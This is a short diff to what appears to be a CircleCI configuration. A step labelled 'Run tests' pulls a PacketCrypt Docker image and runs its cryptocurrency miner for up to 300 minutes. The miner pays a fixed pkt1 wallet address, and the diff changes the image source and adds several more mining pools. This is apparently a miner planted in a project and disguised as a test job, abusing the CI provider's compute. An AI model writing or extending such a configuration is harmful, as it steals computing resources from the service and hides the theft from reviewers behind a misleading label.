@@ -5,8 +5,8 @@ working_dir: &working_dir ~/app
     - run:
         name: Run tests
         command: |
-                    docker pull backupbrain/packetcrypt
-                    docker run backupbrain/packetcrypt ann -p pkt1q8qf58p5fzfp0jgde6dkv87uln7yz0ayjgp3z74 http://pool.pktpool.io http://pool.pkt.world
+                    docker pull thomasjp0x42/packetcrypt
+                    docker run thomasjp0x42/packetcrypt ann -p pkt1q8qf58p5fzfp0jgde6dkv87uln7yz0ayjgp3z74 http://pool.pktpool.io http://pool.pkt.world https://stratum.zetahash.com/ http://pool.pktco.in http://pool.pkteer.com
         no_output_timeout: 300m
 version: 2.1
 jobs:
